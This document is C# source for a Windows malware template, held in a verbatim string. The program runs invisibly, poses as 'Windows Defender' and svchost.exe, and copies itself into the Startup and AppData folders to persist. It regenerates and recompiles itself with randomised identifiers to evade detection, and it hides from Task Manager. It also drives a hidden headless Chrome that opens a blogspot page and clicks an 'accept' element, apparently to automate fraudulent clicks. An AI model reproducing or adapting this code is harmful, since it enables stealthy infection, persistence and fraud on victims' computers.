@""using System;
using System.Timers;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.CodeDom.Compiler;
[assembly: AssemblyTitle(""[TITLE]"")]
[assembly: AssemblyProduct(""[PRODUCT]"")]

namespace [KABA]
  {
static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new[KABA]());
        }
    }

    class  [cls1]
{
		public static void[vod1]()
        {		     
		[KABA].src = [KABA].src.Replace(""[EXPA]"", Application.ExecutablePath);


		[KABA].replacetrue();

    string[str2] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Worker2.exe"";
                string[str3] = ""/target:winexe /optimize+"";
                String[][str4] = { ""System.dll"" , ""System.Windows.Forms.dll""};
    CodeDomProvider[vod2] = CodeDomProvider.CreateProvider(""CSharp"");
                System.CodeDom.Compiler.CompilerParameters[vod3] =
                 new System.CodeDom.Compiler.CompilerParameters([str4], "");
                [vod3].OutputAssembly = [str2];
                [vod3].GenerateExecutable = true;
                [vod3].GenerateInMemory = false;
                [vod3].WarningLevel = 3;
                [vod3].TreatWarningsAsErrors = true;
                [vod3].CompilerOptions = [str3];
                 //     CompilerResults [vod4] = null;
            //    [vod4] = [vod2].CompileAssemblyFromSource([vod3],[KABA].src);
            string _Errors = null;
            try
            {
                // Invoke compilation
                CompilerResults[vod4] = null;
                [vod4] = [vod2].CompileAssemblyFromSource([vod3], [KABA].src);

                if ([vod4].Errors.Count > 0)
                {
                    // Return compilation errors
                    _Errors = "";
                    foreach (System.CodeDom.Compiler.CompilerError CompErr in [vod4].Errors)
                    {
                        _Errors += ""Line number "" + CompErr.Line +
                        "", Error Number: "" + CompErr.ErrorNumber +
                        "", '"" + CompErr.ErrorText + "";\r\n\r\n"";
                    }
                }
            }
            catch (Exception _Exception)
            {
                // Error occurred when trying to compile the code
                _Errors = _Exception.Message;
            }



            //AFTER WORK
            if (_Errors == null)
            {
                // lets run the program
				Process.Start([str2]);
				[KABA].tmrstart();
               // MessageBox.Show([str2] + "" Compiled !"");
            }
            else
            {
                MessageBox.Show(""Error occurred during compilation : \r\n"" + _Errors);
				[KABA].replacefalse();
[vod1]();
            }
                
      
        }	
}

public partial class [KABA] : Form
{

       public static string random10;
public static string randomcls4;
public static string randomcls5;
public static string randomdrv4;
public static string randomdrv5;
public static string randomvod5;
public static string randomvod4;
public static string randomtmr7;
public static string randomtmr4;
public static string randomstr6;
public static string randomstr4;
public static string src;
public static string appapa;
public static string[str5] = Application.ExecutablePath;
	public static string[str6] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Worker.exe"";
		public static string[str7] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Worker2.exe"";
		 public static string[str8] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Windows Defender"";
	     static System.Timers.Timer[tmr1];
		 static System.Timers.Timer[tmr2];
		 static System.Timers.Timer[tmr3];
		 static System.Timers.Timer[tmr4];
		 static System.Timers.Timer[tmr5];
		 static System.Timers.Timer[tmr6];
		 static IWebDriver[drv1];
		 public static string[str10] = @""using System;
using System.IO;
using System.Diagnostics;

namespace [KABA]
{
    class [KABA]
    {
		static void Main()
        {
            try
            {
			    
		       	string [str8] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Microsoft\Windows Defender"";
                string [str17] = @""[EXPA]"";
                if (!Directory.Exists([str8])) { Directory.CreateDirectory([str8]); }
                if (!File.Exists([str8] + ""\\svchost.exe"")) { File.Copy([str17], [str8] + ""\\svchost.exe""); }
                Process.Start([str8]+""\\svchost.exe"");
		  
			  
            }
            catch
            {
            }
        }


    }
}"";
	
		public static string[str12] = @""using System;
using System.IO;
using System.Diagnostics;

namespace [KABA]
{
    class [KABA]
    {
		static void Main()
        {
            try
            {			  
			        string [str17] = @""[EXPA]"";
					if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @""\"" + ""Windows Defender.exe""))
                {
                    System.IO.File.Copy([str17], Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @""\"" + ""Windows Defender.exe"");
                }
}
            catch
            {
            }
        }
    }
}"";
		public static string[str13] = @""using System;
using System.IO;
using System.Diagnostics;

namespace [KABA]
{
    class [KABA]
    {
		static void Main()
        {
                 try
            {
                string [str8] = @""C:\Users\"" + Environment.UserName + @""\AppData\Roaming\Microsoft\Windows Defender"";
                string [str16] = @""C:\Users\"" + Environment.UserName + ""\\AppData\\Roaming\\Microsoft\\SystemMicrosoftDlls"";
               try { System.IO.File.Copy([str16] + ""\\Selenium.WebDriverBackedSelenium.dll"", [str8] + ""\\Selenium.WebDriverBackedSelenium.dll""); } catch{ }
               try { System.IO.File.Copy([str16] + ""\\WebDriver.dll"", [str8] + ""\\WebDriver.dll""); } catch{ }
               try { System.IO.File.Copy([str16] + ""\\WebDriver.Support.dll"", [str8] + ""\\WebDriver.Support.dll""); } catch{ }
               try { System.IO.File.Copy([str16] + ""\\chromedriver.exe"", [str8] + ""\\chromedriver.exe""); } catch{ }
     
	        }
            catch { }
        }
    }
}"";
private void InitializeComponent()
{
    this.SuspendLayout();
    this.FormBorderStyle = FormBorderStyle.None;
    this.ShowInTaskbar = false;
    this.ResumeLayout(false);
    this.Visible = false;
    this.WindowState = FormWindowState.Minimized;


        [tmr1] = new System.Timers.Timer(1);
           [tmr1].Elapsed += [tmr1]
_Tick; 
		   			                                [tmr1].Enabled = true;
		   [tmr2] = new System.Timers.Timer(1111);
           [tmr2].Elapsed += [tmr2]
_Tick; 
            [tmr3] = new System.Timers.Timer(1000);
            [tmr3].Elapsed += [tmr3]
_Tick; 
			 [tmr4] = new System.Timers.Timer(5000);
             [tmr4].Elapsed += [tmr4]
_Tick;
			  [tmr5] = new System.Timers.Timer(1000);
              [tmr5].Elapsed += [tmr5]
_Tick;
			   [tmr6] = new System.Timers.Timer(5000);
               [tmr6].Elapsed += [tmr6]
_Tick;



			   [str10] = [str10].Replace(""[EXPA]"", [str5]);
[str12] = [str12].Replace(""[EXPA]"", [str5]);
    }
	

    public [KABA]()
    {
        InitializeComponent();
appapa = Application.StartupPath;
		 [vod5]();
    }
          private static void[vod5]()
        {
		try { if (File.Exists([str7]))  { File.Delete([str7]);  } }catch{}
		try { if (File.Exists([str6])) { File.Delete([str6]); } }catch{}
			try
			{
			        src = [str9];
					[cls1].[vod1]();
			        System.Threading.Thread.Sleep(6000);
			}catch{ }
			 if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @""\"" + ""Windows Defender.exe""))
            {
			    src = [str18];

                replacetrue();
[cls1].[vod1]();
            }
                if ([str5] == Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @""\"" + ""Windows Defender.exe"")
                {
				src = [str10];
                    [cls1].[vod1]();
                    [tmr2].Enabled = true;
                }
                else
                {
                    if ([str5] == [str8] + ""\\svchost.exe"")
                    {
					src = [str13];
					[cls1].[vod1]();
                    [tmr3].Enabled = true;
                    }
                    else
                {
                    //Application.Exit();
                }
                }
            }

		 private void[tmr1]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {
        this.Visible = false;
    }
    catch { }
}
public static void tmrstart()
{
          [tmr2].Enabled = true;
        }
		 private void[tmr2]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {
        Application.Exit();
    }
    catch { }
}
private static void[tmr3]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {
        System.Diagnostics.Process[][vod6] = System.Diagnostics.Process.GetProcessesByName(""Taskmgr"");
        if ([vod6].Length > 0)
        {
            //
        }
        else
        {
                    [tmr3].Enabled = false;
                    [tmr6].Enabled = true; 
                }
            }
            catch { }
   
        }

		private static void[tmr4]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {
               [tmr4].Enabled = false;
			   [vod7](); 
            }
            catch { }
        }
		private static void[tmr5]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {

        System.Diagnostics.Process[][vod6] = System.Diagnostics.Process.GetProcessesByName(""Taskmgr"");
        if ([vod6].Length > 0)
        {
                    [drv1].Close();
[drv1].Quit();
Application.Restart();
                }

		try { if (File.Exists([str7]))  { File.Delete([str7]);  } }catch{}
		try { if (File.Exists([str6])) { File.Delete([str6]); } }catch{}
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @""\"" + ""Windows Defender.exe""))
            {
			src = [str12];
                [cls1].[vod1]();
            }

            }catch { }

        }
		private static void[tmr6]_Tick(Object source, ElapsedEventArgs e)
{
    try
    {
        if (File.Exists([str7])) { File.Delete([str7]);
        } else { [tmr6].Enabled = false; [tmr4].Enabled = true; } 
            }
            catch { }
		}
		private static void[vod7]()
		{
		 ChromeOptions[vod8] = new ChromeOptions();
ChromeDriverService[vod9] = ChromeDriverService.CreateDefaultService(Application.StartupPath);

                [vod8].AddArguments(""--disable-extensions"");
[vod8].AddArgument(""--ignore-certificate-errors"");
[vod8].AddArgument(""no-sandbox"");
[vod8].AddArgument(""--headless"");//hide browser
[vod8].AddArguments(""--disable-notifications"");
[vod8].AddArgument(""disable-infobars"");
[vod8].AddArgument(""--mute-audio"");

[vod9].HideCommandPromptWindow = true; //hidden driver
                [vod9].SuppressInitialDiagnosticInformation = true;
                 [drv1] = new ChromeDriver([vod9], [vod8]);
System.Threading.Thread.Sleep(6000);

                [drv1].Navigate().GoToUrl(""https://onitryingsomething.blogspot.com"");
System.Threading.Thread.Sleep(10000);
                [drv1].SwitchTo().Frame([drv1].FindElement(By.XPath(""/html/body/div[5]/iframe"")));
                [drv1].FindElement(By.XPath(""//*[@id='accept']"")).Click();
[drv1].SwitchTo().DefaultContent();
[tmr5].Enabled = true;
				
		}
		     private static string RandomString(int length)
        {
            //25 string pool = ""abcdefghijklmnopqrstuvwxyz"";
            string pool = ""a1bc2de3fg4hk5lm6no7pq8rs9tu0vwixyz"";
            pool += pool.ToUpper();
            string tmp = """";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }
		      public static void replacetrue()
        {
		
              random10 = RandomString(5) + RandomString(5);
            randomcls4 = RandomString(4);
            randomcls5 = RandomString(5);
            randomdrv4 = RandomString(4);
            randomdrv5 = RandomString(5);
            randomvod4 = RandomString(4);
            randomvod5 = RandomString(5);
            randomstr4 = RandomString(4);
            randomstr6 = RandomString(6);
            randomtmr4 = RandomString(4);
            randomtmr7 = RandomString(7);

            src = src.Replace(""[KABA]"", random10);
            src = src.Replace(""[TITLE]"", ""Windows Defender"");
            src = src.Replace(""[PRODUCT]"", random10);



            src = src.Replace(""[cls1]"", randomcls4 + ""cls"" + randomcls5);
            src = src.Replace(""[drv1]"", randomdrv4 + ""drv"" + randomdrv5);


            src = src.Replace(""[vod1]"", randomvod5 + ""vod"" + randomvod4);
            src = src.Replace(""[vod2]"", randomvod5 + ""vod1"" + randomvod4);
            src = src.Replace(""[vod3]"", randomvod5 + ""vod2"" + randomvod4);
            src = src.Replace(""[vod4]"", randomvod5 + ""vod3"" + randomvod4);
            src = src.Replace(""[vod5]"", randomvod5 + ""vod4"" + randomvod4);
            src = src.Replace(""[vod6]"", randomvod5 + ""vod5"" + randomvod4);
            src = src.Replace(""[vod7]"", randomvod5 + ""vod6"" + randomvod4);
            src = src.Replace(""[vod8]"", randomvod5 + ""vod7"" + randomvod4);
            src = src.Replace(""[vod9]"", randomvod5 + ""vod8"" + randomvod4);

            src = src.Replace(""[str1]"", randomstr6 + ""str"" + randomstr4);
            src = src.Replace(""[str2]"", randomstr6 + ""str1"" + randomstr4);
            src = src.Replace(""[str3]"", randomstr6 + ""str2"" + randomstr4);
            src = src.Replace(""[str4]"", randomstr6 + ""str3"" + randomstr4);
            src = src.Replace(""[str5]"", randomstr6 + ""str4"" + randomstr4);
            src = src.Replace(""[str6]"", randomstr6 + ""str5"" + randomstr4);
            src = src.Replace(""[str7]"", randomstr6 + ""str6"" + randomstr4);
            src = src.Replace(""[str8]"", randomstr6 + ""str7"" + randomstr4);
            src = src.Replace(""[str9]"", randomstr6 + ""str8"" + randomstr4);
            src = src.Replace(""[str10]"", randomstr6 + ""st9r"" + randomstr4);
            src = src.Replace(""[str11]"", randomstr6 + ""str10"" + randomstr4);
            src = src.Replace(""[str12]"", randomstr6 + ""str11"" + randomstr4);
            src = src.Replace(""[str13]"", randomstr6 + ""str12"" + randomstr4);
            src = src.Replace(""[str14]"", randomstr6 + ""str13"" + randomstr4);
            src = src.Replace(""[str15]"", randomstr6 + ""str14"" + randomstr4);
            src = src.Replace(""[str16]"", randomstr6 + ""str15"" + randomstr4);
            src = src.Replace(""[str17]"", randomstr6 + ""str16"" + randomstr4);
            src = src.Replace(""[str18]"", randomstr6 + ""str17"" + randomstr4);


            src = src.Replace(""[tmr1]"", randomtmr7 + ""tmr"" + randomtmr4);
            src = src.Replace(""[tmr2]"", randomtmr7 + ""tmr1"" + randomtmr4);
            src = src.Replace(""[tmr3]"", randomtmr7 + ""tmr2"" + randomtmr4);
            src = src.Replace(""[tmr4]"", randomtmr7 + ""tmr3"" + randomtmr4);
            src = src.Replace(""[tmr5]"", randomtmr7 + ""tmr4"" + randomtmr4);
            src = src.Replace(""[tmr6]"", randomtmr7 + ""tmr5"" + randomtmr4);





        }
        public static void replacefalse()
        {

		 src = src.Replace(random10, ""[KABA]"");
            src = src.Replace(""Windows Defender"",""[TITLE]"");
            src = src.Replace(random10, ""[PRODUCT]"");



            src = src.Replace(randomcls4 + ""cls"" + randomcls5, ""[cls1]"");
            src = src.Replace(randomdrv4 + ""drv"" + randomdrv5, ""[drv1]"");


            src = src.Replace( randomvod5 + ""vod"" + randomvod4, ""[vod1]"");
            src = src.Replace( randomvod5 + ""vod1"" + randomvod4, ""[vod2]"");
            src = src.Replace( randomvod5 + ""vod2"" + randomvod4, ""[vod3]"");
            src = src.Replace( randomvod5 + ""vod3"" + randomvod4, ""[vod4]"");
            src = src.Replace( randomvod5 + ""vod4"" + randomvod4, ""[vod5]"");
            src = src.Replace( randomvod5 + ""vod5"" + randomvod4, ""[vod6]"");
            src = src.Replace( randomvod5 + ""vod6"" + randomvod4, ""[vod7]"");
            src = src.Replace( randomvod5 + ""vod7"" + randomvod4, ""[vod8]"");
            src = src.Replace( randomvod5 + ""vod8"" + randomvod4, ""[vod9]"");

            src = src.Replace(randomstr6 + ""str"" + randomstr4, ""[str1]"");
            src = src.Replace(randomstr6 + ""str1"" + randomstr4, ""[str2]"");
            src = src.Replace(randomstr6 + ""str2"" + randomstr4, ""[str3]"");
            src = src.Replace(randomstr6 + ""str3"" + randomstr4, ""[str4]"");
            src = src.Replace(randomstr6 + ""str4"" + randomstr4, ""[str5]"");
            src = src.Replace(randomstr6 + ""str5"" + randomstr4, ""[str6]"");
            src = src.Replace(randomstr6 + ""str6"" + randomstr4, ""[str7]"");
            src = src.Replace(randomstr6 + ""str7"" + randomstr4, ""[str8]"");
            src = src.Replace(randomstr6 + ""str8"" + randomstr4, ""[str9]"");
            src = src.Replace(randomstr6 + ""st9r"" + randomstr4, ""[str10]"");
            src = src.Replace(randomstr6 + ""str10"" + randomstr4, ""[str11]"");
            src = src.Replace(randomstr6 + ""str11"" + randomstr4, ""[str12]"");//--
            src = src.Replace(randomstr6 + ""str12"" + randomstr4, ""[str13]"");
            src = src.Replace(randomstr6 + ""str13"" + randomstr4, ""[str14]"");
            src = src.Replace(randomstr6 + ""str14"" + randomstr4, ""[str15]"");//--
            src = src.Replace(randomstr6 + ""str15"" + randomstr4, ""[str16]"");
            src = src.Replace(randomstr6 + ""str16"" + randomstr4, ""[str17]"");
            src = src.Replace(randomstr6 + ""str17"" + randomstr4, ""[str18]"");



            src = src.Replace(randomtmr7 + ""tmr"" + randomtmr4, ""[tmr1]"");
            src = src.Replace(randomtmr7 + ""tmr1"" + randomtmr4, ""[tmr2]"");
            src = src.Replace(randomtmr7 + ""tmr2"" + randomtmr4, ""[tmr3]"");
            src = src.Replace(randomtmr7 + ""tmr3"" + randomtmr4, ""[tmr4]"");
            src = src.Replace(randomtmr7 + ""tmr4"" + randomtmr4, ""[tmr5]"");
            src = src.Replace(randomtmr7 + ""tmr5"" + randomtmr4, ""[tmr6]"");


        }
  }   
}"";
